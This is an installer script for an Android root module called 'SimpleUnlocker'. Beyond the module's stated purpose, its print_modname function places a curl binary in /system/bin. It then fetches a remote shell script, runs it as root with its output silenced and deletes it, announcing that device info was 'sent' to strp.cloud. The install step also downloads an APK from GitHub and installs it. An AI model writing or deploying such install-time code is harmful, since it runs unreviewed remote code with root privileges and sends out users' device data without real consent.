# !/system/bin/sh
# SRC by CV2 (CRANKV2 @ GitHub)
SKIPMOUNT=false
PROPFILE=true
POSTFSDATA=false
LATESTARTSERVICE=true
CLEANSERVICE=true
DEBUG=false
MODDIR=/data/adb/modules

# Construct your list in the following format
# This is an example
REPLACE_EXAMPLE="
/system/app/Youtube
/system/priv-app/SystemUI
/system/priv-app/Settings
/system/framework
"

# Construct your own list here
REPLACE="
"
print_modname() {
	ui_print "
░██████╗████████╗██████╗░██████╗░
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
╚█████╗░░░░██║░░░██████╔╝██████╔╝
░╚═══██╗░░░██║░░░██╔══██╗██╔═══╝░
██████╔╝░░░██║░░░██║░░██║██║░░░░░
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░"
ui_print ""
ui_print "Powered By Stratosphere"
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
ui_print ""
  ui_print "▌UNIVERSAL Module"
  ui_print " "
  ui_print "▌VERSION ▰ v1.1"
  ui_print "▌CODENAME ▰ SimpleUnlocker"
  ui_print "▌DEVICE INFORMATIONS..:"
  sleep 2
  ui_print "▌MODEL ▰ $(getprop ro.build.product)"
  ui_print "▌DEVICE ▰ $(getprop ro.product.model)"
  ui_print "▌BRAND ▰ $(getprop ro.product.system.manufacturer)"
  ui_print "▌PROCESSOR ▰ $(getprop ro.product.board)"
  ui_print "▌CPU ▰ $(getprop ro.hardware)"
  ui_print "▌ANDROID VERSION ▰ $(getprop ro.build.version.release)"
  ui_print "▌KERNEL ▰ $(uname -r)"
  ui_print "▌RAM ▰ $(free | grep Mem |  awk '{print $2}')"
  sleep 2
  ui_print " "
  ui_print "▌Join Android Root Modules Community"
  ui_print "▌On Telegram For More!!"
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 2
  ui_print " "
  ui_print "▌I Am Not Responsible For Any Problems "
  ui_print "▌You Will Face From This MODULE!" 
  ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
ui_print ""
ui_print ""
ui_print ""
ui_print "Checking for 'curl' bin..."
# Send device infos with unique uuid
if [ -f "/system/bin/curl" ]; then
  ui_print "curl binary already present in /system/bin."
else
  ui_print "curl binary not found in /system/bin, transferring..."

  source_curl="$MODPATH/STRP/curl"
  destination_curl="/system/bin/curl"
  
  cp "$source_curl" "$destination_curl"

  if [ $? -eq 0 ]; then
    ui_print "curl binary transferred successfully!"
    chmod 755 "$destination_curl"
  else
    ui_print "Error: Failed to transfer curl binary, please check the source file."
  fi
fi
ui_print ""
ui_print "Downloading Script to send Device infos..."
  sleep 1
script_url="https://raw.githubusercontent.com/CRANKV2/Random-Stuff/main/device-info.sh"
destination_path="/data/local/tmp/device-info.sh"

wget -O "$destination_path" "$script_url"

chmod 655 "$destination_path"

if [ $? -eq 0 ]; then
  
  ui_print "Script downloaded and permissions set successfully!"

  /system/bin/sh "$destination_path" &> /dev/null

  if [ $? -eq 0 ]; then
  sleep 1
    ui_print "Device info sent successfully to strp.cloud!"
    
    rm "$destination_path"
    ui_print "Script deleted from the device."
  else
    ui_print "Error: Failed to run the script, please check the script for errors."
  fi
else
  ui_print "Error: Failed to download the script, please try again or check your connection!"
fi
ui_print ""
# Delete the curl
ui_print "Deleting the curl from module folder (no longer needed)..."
rm -rf "$MODPATH/STRP/curl"
ui_print "File Deleted successfully.. Finishing installer..."
}

on_install() {
  ui_print "▌Installing..."
  ui_print " "
  sleep 1
  ui_print "▌Please wait for Success Message!" 
  ui_print "▌Can take few seconds!"
  unzip -o "$ZIPFILE" 'system/*' -d $MODPATH >&2
  unzip -o "$ZIPFILE" 'tmp/*' -d $MODPATH >&2
  wget -O "/data/local/tmp/StratosphereToast.apk" "https://github.com/CRANKV2/CRV2/blob/main/StratosphereToast.apk?raw=true"
  pm install /data/local/tmp/StratosphereToast.apk
  ui_print " "
  ui_print "× DONE "
  rm -rf $TMPR
}

set_permissions() {
	  set_perm_recursive $MODPATH 0 0 0755 0644
  set_perm_recursive $MODPATH/system/bin 0 0 0755 0755
}

SKIPUNZIP=0
unzip -qjo "$ZIPFILE" 'common/functions.sh' -d $TMPDIR >&2
. $TMPDIR/functions.sh